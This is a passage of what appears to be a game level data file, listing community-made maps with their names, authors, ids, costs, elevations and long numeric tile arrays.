Pencil",id="#1662787128",direction="right",cost=161,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,6,6,6,6,6,6,6,6,6,6,6,6,6,6,96,6,2,0,0,1,6,6,6,6,6,6,6,6,6,6,6,6,6,6,96,6,2,0,0,1,0,0,0,0,26,0,0,0,0,0,0,0,0,28,1,0,0,0,0,1,26,0,0,0,27,0,19,19,0,19,0,0,0,0,1,0,0,0,0,1,0,0,97,0,28,0,19,0,0,0,0,0,0,29,1,0,0,0,0,1,0,0,40,0,29,0,0,97,0,0,0,0,0,0,1,0,0,0,0,1,26,0,40,0,30,0,19,44,0,39,0,0,0,30,1,0,0,0,0,1,0,0,40,0,31,0,0,44,0,38,0,0,0,0,1,0,0,0,0,1,0,0,40,0,32,0,19,43,0,37,0,0,0,31,1,0,0,0,0,1,26,0,40,0,33,0,19,23,0,36,0,0,0,0,1,0,0,0,0,1,0,0,38,0,34,0,3,23,0,35,0,0,0,32,1,0,0,0,0,1,0,0,38,0,35,0,0,0,0,34,0,0,0,0,1,0,0,0,0,1,26,0,36,0,36,0,0,32,32,33,0,0,0,33,1,0,0,0,0,1,97,0,36,0,0,0,0,0,0,0,0,0,0,97,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 6",author="TF2 Pencil",id="#1662787169",direction="left",cost=164,elevation=19,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,5,5,6,7,8,9,10,11,12,13,14,15,16,17,1,0,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,18,1,0,0,0,0,1,5,5,0,97,0,0,0,97,0,0,0,97,0,19,1,0,0,0,0,1,5,5,0,24,0,0,0,24,0,0,0,24,0,20,1,0,0,0,0,1,96,96,0,0,0,0,0,0,0,0,0,0,0,21,1,0,0,0,0,1,96,96,0,0,0,0,0,0,0,0,0,0,0,22,1,0,0,0,0,1,5,5,0,44,0,44,0,44,0,44,0,44,0,23,1,0,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,24,1,0,0,0,0,1,5,5,0,44,0,44,0,44,0,44,0,44,0,24,1,0,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,24,1,0,0,0,0,1,5,5,0,44,0,44,0,44,0,44,0,44,0,0,1,0,0,0,0,1,3,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,24,96,24,24,0,0,0,0,0,0,0,0,0,0,24,24,1,0,0,2,24,96,24,24,0,0,44,0,44,0,44,0,44,0,24,97,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Throwing Stuff",author="TF2 Pencil",id="#1662787227",direction="right",cost=266,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,125,54,14,54,54,40,54,54,54,54,54,54,54,54,54,14,0,0,0,0,14,54,54,54,54,54,54,54,54,54,40,54,54,1,54,14,0,0,0,0,14,54,54,114,54,54,1,54,14,54,114,54,54,54,14,14,0,0,0,0,14,14,54,54,54,14,54,54,54,54,54,54,40,54,54,14,0,0,0,0,14,54,54,1,54,54,54,40,54,1,54,114,54,54,54,14,0,0,0,0,14,54,40,54,54,54,114,54,54,54,54,54,54,1,54,14,0,0,0,0,14,54,54,54,1,54,54,54,54,54,14,54,54,54,54,14,0,0,0,0,14,54,114,54,54,54,54,14,54,1,54,114,54,54,54,14,0,0,0,0,14,54,54,54,54,40,54,54,54,54,54,54,40,54,54,14,0,0,0,0,14,54,54,54,54,54,54,114,54,14,54,54,54,54,54,14,0,0,0,0,14,54,54,114,54,54,54,54,54,54,54,54,54,14,54,14,0,0,0,0,14,1,54,54,54,1,54,114,54,40,114,54,54,54,1,14,0,0,0,0,14,54,54,40,54,54,54,54,54,54,54,54,40,54,54,14,0,0,0,0,14,54,54,54,54,54,14,54,54,54,54,54,54,54,54,14,14,2,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="idk what I made",author="TF2 Pencil",id="#1662787341",direction="left",cost=228,elevation=1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,1,13,97,13,1,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,7,7,0,2,8,8,8,8,8,8,8,8,1,13,133,13,1,0,0,7,7,7,0,2,8,8,8,8,8,8,137,8,1,13,13,13,1,0,0,7,131,7,0,0,0,0,0,0,0,8,8,8,1,13,13,13,1,0,0,7,7,7,0,0,0,0,1,1,1,1,1,1,1,134,13,132,1,1,1,1,1,1,1,0,0,0,1,13,13,13,13,13,132,96,96,96,134,13,13,13,13,13,1,0,0,0,1,97,13,133,13,13,13,96,136,96,13,13,13,133,13,97,1,0,0,0,1,13,13,13,13,13,134,96,96,96,132,13,13,13,13,13,1,0,0,0,1,1,1,1,1,1,1,132,13,134,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,133,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,97,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="doorhuggers pepela",author="Fara",id="#1662808938",direction="forward",cost=304,elevation=6,map=[0,0,26,2,2,26,0,0,0,0,0,26,26,26,26,26,26,26,0,0,0,0,26,26,26,90,0,0,0,0,26,26,1,1,1,1,1,26,26,0,0,26,26,26,26,26,26,0,0,26,26,1,1,109,109,109,1,1,26,26,0,26,6,25,25,6,26,0,0,26,1,1,109,109,109,109,109,1,1,129,0,26,25,0,0,25,26,0,0,1,1,109,109,109,109,109,89,109,1,1,0,26,6,25,25,6,26,0,0,1,109,109,109,109,109,109,109,109,109,1,0,26,26,90,26,26,26,0,0,1,110,110,110,110,1,109,109,109,109,1,0,0,26,26,26,26,0,0,0,1,110,90,110,110,1,109,109,109,109,1,0,0,26,26,26,26,0,0,0,1,111,111,111,111,1,108,108,108,108,1,0,24,91,91,91,91,24,0,0,1,111,111,111,111,1,108,108,108,108,1,0,0,0,0,0,0,0,0,0,1,112,112,112,112,1,107,107,90,107,1,0,0,26,26,26,26,0,0,0,1,112,89,112,112,1,107,107,107,107,1,0,0,26,26,26,26,0,0,0,1,112,112,112,112,1,106,106,106,106,1,0,0,26,90,26,26,0,0,24,1,12,12,12,12,1,0,0,106,106,1,0,0,26,26,26,26,26,26,26,106,46,46,46,46,106,91,0,0,106,1,0,0,26,26,26,26,26,26,26,106,46,46,46,46,106,106,91,0,0,1,0,0,0,26,26,89,26,26,26,106,46,46,90,46,106,106,106,91,1,1,0,0,0,0,26,26,26,26,26,106,46,46,46,46,106,106,106,1,1,0,0,0,0,0,0,0,0,0,24,1,12,12,12,12,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,12,2,2,12,1,0,0,0,0,0]});
maps.push({name="Tower of Ordeals",author="Fara",id="#1662811116",direction="forward",cost=210,elevation=19,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,0,50,10,0,10,0,0,0,105,105,0,0,0,0,10,10,0,50,1,1,50,50,0,10,10,0,0,0,0,5,0,0,0,10,0,10,50,50,1,1,51,0,18,0,3,0,18,0,5,5,0,18,132,3,0,0,51,0,1,1,51,51,0,18,5,18,134,18,5,0,0,18,18,5,18,0,51,51,1,1,0,52,0,0,5,0,18,18,5,5,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,52,52,1,1,53,0,0,0,5,0,0,0,0,5,0,0,0,5,0,0,0,0,1,1,53,53,0,0,0,0,0,0,5,5,0,0,0,0,5,0,53,53,1,1,0,0,0,0,0,5,0,0,5,5,0,0,0,0,0,0,0,54,1,1,54,54,0,0,0,5,0,5,5,0,5,0,5,5,0,0,54,54,1,1,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,55,0,1,1,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,1,1,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,1,1,0,56,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,1,1,57,0,23,23,0,23,0,0,5,5,0,0,0,23,23,23,0,57,1,1,0,57,23,0,23,23,0,0,3,3,0,0,23,23,0,23,57,0,1,1,58,58,0,0,24,0,24,24,0,24,24,0,24,0,0,0,0,58,1,1,131,58,0,0,0,24,0,24,124,124,24,24,0,24,0,0,58,133,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="oh look items",author="sivi",id="#1662834653",direction="forward",cost=230,elevation=0,map=[0,0,0,1,1,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,90,5,5,90,1,1,0,0,0,0,0,0,0,0,0,0,1,130,1,5,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,0,1,1,5,5,5,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,0,1,9,9,5,5,5,5,88,67,24,1,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,88,67,24,1,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,1,1,1,0,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,0,1,94,9,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,0,1,1,1,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,0,1,1,90,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,1,1,90,5,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,1,24,67,88,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,1,24,67,88,5,5,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,1,90,5,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,1,1,90,5,5,5,5,5,1,130,1,0,0,0,0,0,0,0,0,0,0,1,1,90,5,5,90,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="bored",author="Headhunterz",id="#1662840508",direction="forward",cost=97,elevation=5,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,92,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,31,24,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,50,50,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,0,0,50,50,0,0,0,0,0,0,0,0,0,0,0,11,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,129,0,0,0,0,0,0,50,50,0,0,0,0,0,0,0,0,94,20,20,93,0,0,0,0,0,0,51,51,0,0,0,0,0,0,0,0,94,20,20,93,0,0,0,0,0,0,51,51,0,0,0,0,0,0,0,0,94,20,20,93,0,0,0,0,0,0,112,112,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,112,38,112,53,53,54,54,54,55,55,0,0,0,0,0,0,0,52,52,52,112,38,112,53,53,54,54,54,55,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,21,93,0,21,0,0,20,0,0,0,14,2,2,14]});
maps.push({name="Waterfall Tower",author="sivi",id="#1662848253",direction="forward",cost=320,elevation=6,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,105,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,105,105,90,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,105,105,105,105,1,1,1,1,1,1,0,0,0,1,1,90,110,90,111,1,105,105,105,105,1,111,90,110,90,1,1,0,0,1,110,110,110,111,90,90,45,45,45,45,90,90,111,110,110,110,1,0,0,1,90,110,110,111,111,45,45,45,45,45,45,111,111,110,110,90,1,0,0,1,109,109,1,1,1,90,45,45,45,45,90,1,1,1,109,109,1,0,0,1,109,109,1,124,67,93,45,45,45,45,94,67,124,1,109,109,1,0,0,1,90,108,1,124,67,93,45,45,45,45,94,67,124,1,108,90,1,0,0,1,108,108,1,1,1,90,45,45,45,45,90,1,1,1,108,108,1,0,0,1,90,107,107,1,1,1,90,45,45,90,1,1,1,107,107,90,1,0,0,1,107,107,107,107,106,106,45,45,45,45,106,106,107,107,107,107,1,0,0,1,1,107,90,107,90,106,45,45,45,45,106,90,107,90,107,1,1,0,0,0,1,1,1,1,1,1,1,11,11,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,90,11,11,90,1,1,1,0,0,0,0,0,0,0,0,0,0,1,124,67,94,11,11,93,67,124,1,0,0,0,0,0,0,0,0,0,0,1,124,67,94,11,11,93,67,124,1,0,0,0,0,0,0,0,0,0,0,1,1,1,90,11,11,90,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Unexpected",author="ZpLit",id="#1662857714",direction="forward",cost=896,elevation=0,map=[0,0,0,144,144,144,144,144,8,2,2,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,95,95,95,95,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,95,95,95,95,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,8,8,8,144,144,144,144,144,0,0,0,0,0,0,144,144,144,144,144,8,2,2,8,144,144,144,144,144,0,0,0]});
maps.push({name="Expected",author="ZpLit",id="#1662857795",direction="forward",cost=844,elevation=0,map});
maps.push({name="Sketchy Staircase",author="sivi",id="#1662859856",direction="forward",cost=140,elevation=9,map=[0,0,0,0,0,0,0,9,5,2,2,5,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,90,5,5,90,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,6,6,6,6,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,85,90,85,90,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,7,7,7,7,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,90,85,90,85,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,8,8,8,8,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,90,85,85,90,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,9,9,9,9,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,85,90,85,90,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,10,10,10,10,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,85,90,90,85,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,11,11,11,11,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,90,85,90,85,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,12,12,12,12,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,90,85,85,90,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,13,13,13,13,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,85,90,85,90,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,14,14,14,14,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,90,2,2,90,93,0,0,0,0,0,0,0]});
maps.push({name="RNG Path",author="Hichatu",id="#1662860825",direction="forward",cost=216,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="LITERALLY EVERYTHING",author="iProbie",id="#1662861457",direction="forward",cost=407,elevation=0,map=[5,2,2,5,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,5,5,5,5,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,121,45,5,5,85,0,0,0,0,0,0,0,0,0,0,0,141,0,0,40,122,46,6,5,5,90,90,0,0,5,131,132,133,0,0,97,5,0,0,41,123,47,7,65,5,5,90,0,87,5,0,0,0,0,5,96,5,0,0,42,124,48,8,66,75,5,5,86,0,5,0,0,0,5,5,0,5,0,0,43,3,49,9,67,76,90,5,5,5,5,0,0,5,5,0,0,5,5,4,44,5,50,10,68,78,90,90,95,95,0,0,5,5,0,0,0,0,0,0,0,5,51,11,70,79,89,88,5,5,5,0,5,101,102,101,0,0,0,0,0,94,52,12,0,80,0,88,5,0,5,5,5,101,101,101,0,0,0,0,0,0,53,13,0,0,5,5,5,0,0,5,5,144,5,5,0,0,0,0,0,135,54,14,103,104,103,0,0,0,5,144,5,5,0,0,5,5,5,0,0,135,55,15,103,103,103,0,5,5,5,144,0,91,91,5,82,83,5,5,5,135,56,16,0,0,0,5,5,0,134,0,0,139,5,5,84,81,129,127,5,135,57,17,0,0,98,98,0,0,136,0,5,72,73,5,5,125,126,128,5,135,58,18,140,140,99,0,0,0,137,0,5,74,71,5,5,142,142,5,5,135,59,19,0,0,5,0,0,0,138,0,5,5,5,5,0,143,143,0,0,0,60,20,0,0,92,0,0,0,0,0,0,0,0,0,0,5,5,5,1,1,61,21,22,23,24,0,0,0,0,0,0,0,0,0,0,1,5,5,100,5,62,63,64,3,5,5,93,0,130,130,130,130,130,130,0,1,5,2,2,5]});
maps.push({name="Seaweed x3",author="ZpLit",id="#1662872239",direction="left",cost=119,elevation=-4,map=[0,0,18,53,2,2,53,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,53,53,53,53,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,51,51,51,51,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,50,50,50,50,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,49,16,16,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,49,49,88,88,49,49,14,0,0,0,0,0,0,0,0,0,0,0,14,49,49,88,66,66,88,49,49,14,0,0,0,0,0,0,0,0,0,0,14,49,49,88,66,66,88,49,49,14,0,0,0,0,0,0,0,0,0,0,0,14,49,49,88,88,49,49,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,88,49,14,14,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,2,49,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,2,49,49,49,49,49,14,0,0,0,0,0,0,0,0,0,0,0,0,0,88,49,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="PUTA",author="ZpLit",id="#1662872501",direction="right",cost=262,elevation=0,map=[11,2,2,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,46,142,46,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,46,11,46,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,97,11,46,93,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,96,96,46,96,96,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,46,46,46,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,65,65,65,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,65,65,65,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,46,46,46,46,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,142,142,142,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,11,46,46,46,46,46,46,90,46,46,11,0,0,0,11,11,11,0,0,0,11,46,46,46,90,46,46,90,46,46,11,11,11,11,46,46,46,11,0,0,11,46,90,46,46,46,46,76,76,46,95,46,46,46,46,90,46,11,0,0,11,46,46,46,46,90,46,76,76,46,95,46,46,46,46,90,46,11,0,0,11,46,46,90,46,46,46,90,46,46,11,11,11,11,46,46,46,11,11,11,11,87,46,46,46,46,46,90,46,46,11,0,0,11,142,142,142,11,46,88,0,11,11,11,11,11,11,11,11,11,0,0,0,11,142,142,142,11,46,2,0,0,0,0,0,0,0,0,0,0,0,0,0,11,46,46,46,90,46,2,0,0,0,0,0,0,0,0,0,0,0,0,0,11,87,46,46,90,46,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11]});
maps.push({name="Book Book Book",author="ZpLit",id="#1662873859",direction="forward",cost=270,elevation=-5,map=[0,0,15,15,15,15,15,15,15,2,2,15,15,15,15,15,15,15,0,0,0,15,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,15,0,0,15,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,15,0,0,15,50,50,105,93,105,105,105,105,105,105,105,105,93,105,50,50,15,0,0,15,50,50,94,105,105,105,65,65,65,65,105,105,105,94,50,50,15,0,0,15,50,50,16,15,14,13,5,5,5,5,13,14,15,16,50,50,15,0,0,15,50,50,49,48,47,46,45,45,45,45,46,47,48,49,50,50,15,0,0,15,50,50,49,48,47,46,45,45,45,45,46,47,48,49,50,50,15,0,0,0,16,16,16,16,14,13,90,45,45,90,13,14,15,16,16,16,0,0,0,0,0,0,0,0,0,12,90,45,45,90,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,90,45,45,90,12,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,90,45,45,90,12,12,0,0,0,0,0,0,0,0,0,0,0,12,45,45,45,45,45,45,45,45,12,0,0,0,0,0,0,0,0,0,0,12,88,88,88,45,45,88,88,88,12,0,0,0,0,0,0,0,0,0,0,12,45,45,45,45,45,45,45,45,12,0,0,0,0,0,0,0,0,0,0,12,88,88,88,45,45,88,88,88,12,0,0,0,0,0,0,0,0,0,0,12,45,45,45,45,45,45,45,45,12,0,0,0,0,0,0,0,0,0,0,12,88,88,88,45,45,88,88,88,12,0,0,0,0,0,0,0,0,0,0,12,45,45,45,45,45,45,45,45,12,0,0,0,0,0,0,0,0,0,0,12,45,45,88,2,2,88,45,45,12,0,0,0,0,0]});
maps.push({name="A TOASTER IS JUST A",author="Fara",id="#1662898301",direction="left",cost=277,elevation=17,map=[24,24,24,24,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,21,22,23,24,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,21,22,23,24,24,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,21,22,23,24,24,24,5,5,5,5,5,5,0,0,0,0,0,0,0,0,2,22,23,24,24,24,4,5,5,5,5,5,0,0,0,0,0,0,0,0,2,22,23,24,24,24,5,5,5,5,5,0,0,0,0,0,0,0,0,0,21,22,23,24,24,24,44,44,5,5,44,44,44,44,44,44,0,0,0,0,21,22,23,24,24,24,5,5,5,5,5,0,8,9,9,44,0,0,0,0,24,22,23,24,24,24,96,5,5,5,5,7,8,9,9,44,0,0,0,0,24,24,24,24,24,24,3,96,5,5,5,7,8,9,9,92,0,0,0,0,24,24,24,24,97,24,3,96,5,5,5,7,8,9,9,92,0,0,0,0,24,22,23,24,24,24,96,5,5,5,5,7,8,9,9,44,0,0,0,0,21,22,23,24,24,24,5,5,5,5,5,0,8,9,9,44,0,0,0,0,21,22,23,24,24,24,44,44,5,5,44,44,44,44,44,44,0,0,0,0,21,22,23,24,24,24,5,5,5,5,5,0,0,0,0,0,0,0,0,0,21,22,23,24,24,24,4,5,5,5,5,5,0,0,0,0,0,0,0,0,21,22,23,24,24,24,5,5,5,5,5,5,0,0,0,0,0,0,0,0,21,22,23,24,24,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,21,22,23,24,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,24,24,24,24,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0]});
